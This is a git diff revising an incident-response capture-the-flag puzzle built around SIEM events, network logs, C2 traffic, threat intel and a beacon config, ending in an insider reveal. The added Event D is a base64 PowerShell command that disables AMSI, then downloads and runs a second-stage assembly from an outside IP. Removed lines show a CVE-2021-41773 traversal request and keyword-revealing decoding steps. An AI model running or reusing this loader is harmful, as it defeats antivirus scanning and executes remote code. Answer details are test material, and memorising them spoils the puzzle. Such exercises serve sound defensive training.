@@ -22,8 +22,6 @@ WS-FIN042 in the Finance VLAN.  Initial triage suggests a sophisticated
 threat actor with command-and-control capability already established
 inside your network.
 
-But something doesn't add up.
-
 The attacker navigated directly to sensitive internal systems that
 aren't discoverable from the outside.  They knew which hosts to
 target, which credentials to use, and which monitoring gaps to
@@ -43,8 +41,9 @@ Time is critical.  The attacker is still active.
 
 ### ARTIFACT 1 — SIEM ALERT TRIAGE  *(SOC Analyst)*
 
-Your SIEM exported four events from WS-FIN042 within the incident
-window.  Three are routine.  **One is the attacker.**
+Your SIEM exported the following process-creation events from
+WS-FIN042 during the incident window.  Identify the attacker's
+execution and extract the hidden keyword from their payload.
 
 ```
 EVENT A — 02:13:55 UTC
@@ -54,194 +53,213 @@ EVENT A — 02:13:55 UTC
   Parent     : taskschd.exe
   CommandLine: powershell.exe -ExecutionPolicy Bypass
                -File C:\Scripts\nightly_backup.ps1
-  Analyst    : Scheduled nightly backup — runs every day at 02:13.
 
-EVENT B — 02:14:12 UTC
+EVENT B — 02:14:02 UTC
+  EventID    : 4688 (Process Create)
+  User       : SYSTEM
+  Process    : MsMpEng.exe
+  Parent     : services.exe
+  CommandLine: "C:\ProgramData\Microsoft\Windows Defender\
+               platform\4.18.24070.5-0\MsMpEng.exe"
+
+EVENT C — 02:14:12 UTC
   EventID    : 4688 (Process Create)
   User       : SYSTEM
   Process    : wuauclt.exe
   Parent     : svchost.exe
   CommandLine: wuauclt.exe /detectnow /updatenow
-  Analyst    : Windows Update detection cycle.
 
-EVENT C — 02:14:33 UTC
+EVENT D — 02:14:33 UTC
   EventID    : 4688 (Process Create)
   User       : CORP\svc_backup
   Process    : powershell.exe
   Parent     : cmd.exe
-  CommandLine: powershell.exe -nop -w hidden -enc QgBSAEUAQQBDAEgA
-  Analyst    : *** NO MATCHING SCHEDULED TASK ***
+  CommandLine: powershell.exe -ep bypass -nop -sta
+               JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5
+               AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0A
+               LgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBt
+               AGEAdABpAG8AbgAuACcAKwBbAGMAaABhAHIAXQA2ADUA
+               KwAnAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAGYAPQAk
+               AGEALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkA
+               JwArACcASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBO
+               AG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcA
+               KQA7ACQAZgAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1
+               AGwAbAAsACQAdAByAHUAZQApADsAJABjAD0ATgBlAHcA
+               LQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBs
+               AGkAZQBuAHQAOwAkAGMALgBIAGUAYQBkAGUAcgBzAC4A
+               QQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAs
+               ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAKQA7ACQAYw
+               AuAFAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAG
+               UAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVw
+               BlAGIAUAByAG8AeAB5ADsAJABjAC4AUAByAG8AeAB5AC
+               4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdA
+               AuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF
+               0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAaw
+               BDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAGIAPQAkAG
+               MALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACcAaA
+               B0AHQAcABzADoALwAvADEAOAA1AC4AMgAyADAALgAxAD
+               AAMQAuADMANAA6ADgANAA0ADMALwBCAFIARQBBAEMASA
+               AvAHMAdABhAGcAZQAyAC4AYgBpAG4AJwApADsAJAByAD
+               0AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQ
+               BtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGIAKQA7AC
+               QAcgAuAEUAbgB0AHIAeQBQAG8AaQBuAHQALgBJAG4Adg
+               BvAGsAZQAoACQAbgB1AGwAbAAsAFsAbwBiAGoAZQBjAH
+               QAWwBdAF0AQAAoACkAKQA=
 
-EVENT D — 02:14:41 UTC
+EVENT E — 02:14:41 UTC
   EventID    : 4688 (Process Create)
   User       : SYSTEM
   Process    : sc.exe
   Parent     : services.exe
   CommandLine: sc.exe start spooler
-  Analyst    : Print spooler service restart.
+
+EVENT F — 02:14:58 UTC
+  EventID    : 4688 (Process Create)
+  User       : CORP\j.martinez
+  Process    : python3.exe
+  Parent     : WindowsTerminal.exe
+  CommandLine: python3.exe C:\Users\j.martinez\scripts\log_rotate.py
+
+EVENT G — 02:15:03 UTC
+  EventID    : 4688 (Process Create)
+  User       : SYSTEM
+  Process    : svchost.exe
+  Parent     : services.exe
+  CommandLine: svchost.exe -k netsvcs -p -s Schedule
+
+EVENT H — 02:15:18 UTC
+  EventID    : 4688 (Process Create)
+  User       : CORP\svc_monitor
+  Process    : cscript.exe
+  Parent     : taskschd.exe
+  CommandLine: cscript.exe //nologo C:\Monitoring\health_check.vbs
 ```
 
-**Find the malicious event.**  What to look for:
-
-- `-nop` (no profile) and `-w hidden` (hidden window) are evasion
-  flags that wouldn't appear in a legitimate admin script
-- The parent process is `cmd.exe`, not `taskschd.exe` — it was
-  launched interactively, not from a scheduled task
-- The same service account `svc_backup` runs both the legitimate
-  backup (Event A) and the suspicious command — the attacker
-  hijacked this account
-- There is no scheduled task on record for this execution
-
-The `-enc` parameter is **Base64-encoded UTF-16LE** — the standard
-encoding PowerShell uses for `-EncodedCommand`.
-
-Decode `QgBSAEUAQQBDAEgA`.
-
-**The plaintext is KEYWORD 1.**
+**KEYWORD 1 is concealed within the attacker's payload.**
 
 ---
 
 ### ARTIFACT 2 — NETWORK TRAFFIC ANALYSIS  *(Incident Response)*
 
-Firewall and DNS logs from the compromised VLAN.  There is a lot of
-legitimate traffic here.  **Find the C2 communication and extract
-the hidden data drop.**
+Firewall and DNS logs from the compromised VLAN during the incident
+window.  Identify the command-and-control infrastructure and extract
+the covert data drop.
 
 ```
 Timestamp      Act    Proto  Source         Destination            Info
 --------------------------------------------------------------------
-02:13:01       ALLOW  TCP    10.0.4.217     20.190.159.2:443       login.microsoftonline.com
-02:13:15       ALLOW  TCP    10.0.4.55      104.16.132.229:443     Cloudflare CDN
-02:13:22       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS query (google.com)
-02:14:02       ALLOW  TCP    10.0.4.217     20.191.45.212:443      Windows telemetry
-02:14:33       ALLOW  TCP    10.0.4.217     45.33.32.156:443       *** SEE ANALYST NOTE ***
-02:14:55       ALLOW  TCP    10.0.4.217     185.220.101.34:443     TLS handshake
+02:13:01       ALLOW  TCP    10.0.4.217     20.190.159.2:443       TLS 1.3 (login.microsoftonline.com)
+02:13:15       ALLOW  TCP    10.0.4.55      104.16.132.229:443     TLS 1.3 (Cloudflare CDN)
+02:13:22       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? google.com
+02:13:30       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? wpad.corp.local [NXDOMAIN]
+02:14:02       ALLOW  TCP    10.0.4.217     20.191.45.212:443      TLS 1.3 (settings-win.data.microsoft.com)
+02:14:33       ALLOW  TCP    10.0.4.217     45.33.32.156:443       TLS 1.2 (scanme.nmap.org)
+02:14:41       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? cdn-update.darkpulse.io -> 185.220.101.34
+02:14:55       ALLOW  TCP    10.0.4.217     185.220.101.34:443     TLS 1.2 ClientHello (SNI: cdn-update.darkpulse.io)
 02:15:01       ALLOW  TCP    10.0.4.217     185.220.101.34:8443    SYN -> ESTABLISHED
-02:15:22       DNS    --     10.0.4.217     --                     A? cdn-update.darkpulse.io -> 185.220.101.34
-02:16:44       ALLOW  TCP    10.0.4.217     10.0.1.5:445           SMB session
-02:17:11       DENY   TCP    10.0.4.217     10.0.1.5:3389          RDP blocked by GPO
-02:17:33       ALLOW  TCP    10.0.4.217     10.0.1.12:5985         WinRM session
-02:18:02       ALLOW  TCP    10.0.1.12      10.0.2.8:22            SSH to Linux jump box
-02:18:30       ALLOW  TCP    10.0.4.55      104.16.133.229:443     Cloudflare (continued)
-02:19:15       ALLOW  TCP    10.0.2.8       185.220.101.34:443     *** SECOND C2 CALLBACK ***
-02:19:44       ALLOW  TCP    10.0.4.217     20.190.159.2:443       Microsoft token refresh
+02:15:22       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS TXT? cdn-update.darkpulse.io
+02:15:45       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? time.windows.com
+02:16:10       ALLOW  TCP    10.0.4.217     40.119.6.228:443       TLS 1.3 (ocsp.digicert.com)
+02:16:44       ALLOW  TCP    10.0.4.217     10.0.1.5:445           SMB3 negotiate
+02:17:11       DENY   TCP    10.0.4.217     10.0.1.5:3389          RST (GPO block)
+02:17:33       ALLOW  TCP    10.0.4.217     10.0.1.12:5985         WinRM session established
+02:17:55       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? update.googleapis.com
+02:18:02       ALLOW  TCP    10.0.1.12      10.0.2.8:22            SSH KEX INIT
+02:18:30       ALLOW  TCP    10.0.4.55      104.16.133.229:443     TLS 1.3 (Cloudflare CDN continued)
+02:19:15       ALLOW  TCP    10.0.2.8       185.220.101.34:443     TLS 1.2 ClientHello (SNI: cdn-update.darkpulse.io)
+02:19:44       ALLOW  TCP    10.0.4.217     20.190.159.2:443       TLS 1.3 (token refresh)
+02:20:01       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? github.com
+02:20:15       ALLOW  TCP    10.0.4.217     140.82.121.4:443       TLS 1.3 (github.com)
 ```
 
-> **Analyst note on 45.33.32.156:** This is `scanme.nmap.org`, used
-> by your own vulnerability management scanner on a weekly schedule.
-> It is **NOT** attacker infrastructure.  Do not pursue this lead.
+The pivot path is clear: `10.0.4.217` → `10.0.1.12` (WinRM) →
+`10.0.2.8` (SSH) → C2 callback.  The attacker had credentials for
+machines they shouldn't know about.
 
-**Key observation:** The attacker pivoted 10.0.4.217 → 10.0.1.12 →
-10.0.2.8, and the final Linux box made its own callback to the C2.
-The attacker already had SSH credentials for a server they shouldn't
-know exists.  Keep this in mind.
-
-Your DNS team pulled all TXT records for the C2 domain:
+Your DNS team pulled the full record set for the C2 domain:
 
 ```
 ;; ANSWER SECTION:
-cdn-update.darkpulse.io.  300  IN  A    185.220.101.34
-cdn-update.darkpulse.io.  300  IN  TXT  "v=spf1 include:_spf.darkpulse.io ~all"
-cdn-update.darkpulse.io.  300  IN  TXT  "google-site-verification=Xk7mQnR2pT0zA"
-cdn-update.darkpulse.io.  300  IN  TXT  "5049564F54"
+cdn-update.darkpulse.io.  300  IN  A      185.220.101.34
+cdn-update.darkpulse.io.  300  IN  AAAA   2606:4700:3030::ac43:8522
+cdn-update.darkpulse.io.  300  IN  MX     10 mail.darkpulse.io.
+cdn-update.darkpulse.io.  300  IN  TXT    "v=spf1 include:_spf.darkpulse.io ~all"
+cdn-update.darkpulse.io.  300  IN  TXT    "google-site-verification=Xk7mQnR2pT0zA9Lv"
+cdn-update.darkpulse.io.  300  IN  TXT    "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC7"
+cdn-update.darkpulse.io.  300  IN  TXT    "5049564f54"
+cdn-update.darkpulse.io.  300  IN  NS     ns1.darkpulse.io.
+cdn-update.darkpulse.io.  300  IN  NS     ns2.darkpulse.io.
 ```
 
-Three TXT records.  Two are standard (SPF policy, Google site
-verification).  The third is a standalone value — a hex-encoded
-dead drop for the implant.
+One of these records doesn't belong.
 
-**Decode the hex string `5049564F54` to ASCII.**
-
-**The decoded text is KEYWORD 2.**
+**KEYWORD 2 is hidden in the DNS records.**
 
 ---
 
 ### ARTIFACT 3 — C2 SERVER RECONNAISSANCE  *(Penetration Tester)*
 
-Your red team probed the C2 at 185.220.101.34 and captured these
-response headers:
+Your red team obtained access to the C2 at `185.220.101.34` and
+captured the following HTTP exchange from its agent check-in API:
 
 ```
+=== REQUEST ===
+POST /api/v2/agent/checkin HTTP/1.1
+Host: cdn-update.darkpulse.io:8443
+User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ2VudC00NzcxIiwiaXNzIjoiY2RuLXVwZGF0ZS5kYXJrcHVsc2UuaW8iLCJpYXQiOjE3MTA0MzI3MjAsImV4cCI6MTcxMDQzNjMyMCwianRpIjoiYThmM2JjOWQtMWUyZi00YTViLTljM2QtN2U4ZjBhMWIyYzNkIiwib3AiOiJTSEVMTCIsInRpZCI6IldTLUZJTjA0MiIsInVpZCI6NDA3NzEsInByaXYiOjMsInBpcGUiOiJtc2FnZW50XzEyIn0.K7xM2pQn9vR3bY5wL1zA4cF6dH8jN0mT2sE4uG6iW8o
+
+{"beacon_id": "4771", "hostname": "WS-FIN042", "internal_ip": "10.0.4.217",
+ "os": "Windows 10 Enterprise 22H2", "integrity": "high", "user": "CORP\\svc_backup"}
+
+=== RESPONSE ===
 HTTP/1.1 200 OK
 Server: Apache/2.4.49 (Unix)
 X-Powered-By: PHP/7.4.3
-X-Backend: PAN-OS GlobalProtect 10.2.2-h5
-Content-Type: text/html; charset=UTF-8
-Set-Cookie: SESSID=a8f3bc9d; Path=/; HttpOnly
+Content-Type: application/json
+Set-Cookie: SESSID=a8f3bc9d; Path=/; HttpOnly; Secure
+
+{"status": "ok", "sleep": 60, "jitter": 15, "tasks": []}
 ```
 
-**Three services are exposed.  Only one has a critical
-actively-exploited RCE.**
+The server is running Apache/2.4.49 — vulnerable to CVE-2021-41773
+(path traversal to RCE).  But the keyword is not in the server's
+filesystem.  It's already in this traffic capture.
 
-| Service | Verdict |
-|---------|---------|
-| `Apache/2.4.49` | **VULNERABLE** — Critical path-traversal to RCE (CVSS 9.8), mass-exploited in late 2021.  CVE-2021-_____ |
-| `PAN-OS 10.2.2-h5` | The base version was hit by CVE-2024-3400, but `-h5` = **Hotfix 5 applied**.  Patched.  Dead end. |
-| `PHP/7.4.3` | End-of-life but no unauthenticated RCE at this version.  Not the way in. |
-
-The C2 server's access log shows two requests during the incident.
-**Only one is the path-traversal exploit.**
-
-```
-[02:20:11] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/home/mhawkins/tools/%53%48%45%4C%4C HTTP/1.1" 200
-[02:20:14] "POST /api/v2/agent/%46%4C%41%52%45/checkin HTTP/1.1" 200
-```
-
-The `/.%2e/.%2e/` directory-traversal pattern is the **signature of
-CVE-2021-41773**.  The second request is a routine agent check-in on
-the C2's REST API — not the exploit.
-
-**URL-decode the final path component of the path-traversal
-request.**
-
-**The decoded text is KEYWORD 3.**
-
-> Watch the traversal path closely: it reaches into
-> `/home/mhawkins/tools/`.  That is an operator home directory on
-> the C2 server.  **Remember this name.**
+**KEYWORD 3 is embedded in the authentication exchange.**
 
 ---
 
 ### ARTIFACT 4 — THREAT INTELLIGENCE  *(Red Team / Intel Analyst)*
 
 Your threat-intel platform matched the C2 infrastructure to a tracked
-campaign.  The adversary encrypts operational codenames in their
-beacons using a **Vigenere cipher**.
+adversary group.
 
 ```
 ========== CIRCL MISP FEED — EVENT 2024-18442 ==========
-Adversary       : APT-7291
-TLP             : AMBER
-Confidence      : HIGH
-IOCs            : 185.220.101.34, cdn-update.darkpulse.io
-Campaign Cipher : SIHRB
-Cipher Method   : Vigenere (standard, A=0)
-Cipher Key      : APT
-Compilation TS  : 2024-03-14T16:32:00-05:00
-PDB Debug Path  : C:\Users\mhawkins\Dev\ghostline\beacon.pdb
+Adversary         : APT-7291  (aliases: DARKPULSE, SILENT TYPHOON)
+TLP               : AMBER
+Confidence        : HIGH
+IOCs              : 185.220.101.34, cdn-update.darkpulse.io
+MITRE ATT&CK      : T1059.001, T1071.004, T1041, T1078.002
+Campaign Cipher   : SIHRB
+Cipher Note       : Group uses polyalphabetic substitution.
+                    Key is derived from the group's primary
+                    three-letter designation.
+Compilation TS    : 2024-03-14T16:32:00-05:00
+PDB Debug Path    : C:\Users\mhawkins\Dev\ghostline\beacon.pdb
+Mutex             : Global\{5E8A1F23-7C4D-4B2A-9E6F-1A3D5B7C9E0F}
 =========================================================
 ```
 
-**Decrypt the campaign name:** Apply Vigenere decryption to `SIHRB`
-with key **APT**.
+The adversary encrypts their operational codenames.
 
-The key repeats: **A-P-T-A-P**.
+**KEYWORD 4 is the decrypted campaign name.**
 
-Use CyberChef ("Vigenere Decode"), dcode.fr, or work it manually
-(subtract key letter positions from cipher letter positions, mod 26).
-
-**The decrypted campaign name is KEYWORD 4.**
-
-> Now look at the rest of this intel.
->
-> **Compilation timestamp:** 2024-03-14 at 16:32 EST.  A Tuesday
-> afternoon.  Business hours at your HQ.
->
-> **PDB debug path:** `C:\Users\mhawkins\Dev\ghostline\beacon.pdb`
->
-> The same `mhawkins` from the C2 server's `/home/mhawkins/tools/`
-> directory.  This malware was compiled on someone's work laptop.
-> Someone inside your organisation built this tool.
+> Note the PDB debug path: `C:\Users\mhawkins\Dev\ghostline\`.
+> This malware was compiled on someone's Windows workstation.
+> Cross-reference this with Artifact 3's access logs.
 
 ---
 
@@ -257,45 +275,42 @@ c2_server      : cdn-update.darkpulse.io
 c2_port        : 8443
 sleep_interval : 60
 jitter_pct     : 15
-xor_key        : 0x23
 user_agent     : Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)
 spawn_to_x86   : %windir%\syswow64\rundll32.exe
 spawn_to_x64   : %windir%\sysnative\rundll32.exe
-campaign_tag   : 64 6B 6C 70 77   [XOR-ENCRYPTED]
-watermark      : 0x5E8A1F00
+watermark      : 0x5E8A1F23
 named_pipe     : \\.\pipe\msagent_##
+process_inject : ntdll!RtlUserThreadStart
+cleanup        : true
+```
+
+```
+========= ENCRYPTED FIELDS (raw hex) ==================
+enc_campaign   : 64 6b 6c 70 77
+enc_operator   : 11 09 00 0f 15 0e 0c
+enc_exfil_uri  : 44 50 50 43 46 12 17 17
 ========================================================
 ```
 
-The `campaign_tag` is **single-byte XOR encrypted** with the key in
-`xor_key` (`0x23`).
+Multiple fields are encrypted.  The encryption key is not stored
+alongside the data — it's embedded elsewhere in the config.  Beacon
+frameworks typically derive their field-encryption key from a fixed
+value in the configuration itself.
 
-XOR each byte with `0x23` and convert to ASCII:
-
-```
-0x64 XOR 0x23 = ?
-0x6B XOR 0x23 = ?
-0x6C XOR 0x23 = ?
-0x70 XOR 0x23 = ?
-0x77 XOR 0x23 = ?
-```
-
-**The decrypted campaign tag is KEYWORD 5.**
-
-*Hint: CyberChef -> "From Hex" -> "XOR" with key
-`{"option":"Hex","string":"23"}`*
+**KEYWORD 5 is one of the decrypted fields above.**
 
 ---
 
-### CASE FILE CLOSED
+### CASE FILE SUMMARY
 
 Assemble the evidence.
 
 The PDB path names `mhawkins`.  The compilation timestamp places
-the build during business hours at HQ.  The C2 tool directory is
-`/home/mhawkins/`.  The hijacked service account `svc_backup`?
-Hawkins administered it.  The SSH credentials for the Linux jump
-box at 10.0.2.8?  Hawkins configured that server last quarter.
+the build during business hours at HQ.  The agent's `uid` field
+matches badge number 40771.  The hijacked service account
+`svc_backup`?  Hawkins administered it.  The SSH credentials for
+the Linux jump box at 10.0.2.8?  Hawkins configured that server
+last quarter.
 
 Cross-referencing HR records:
 
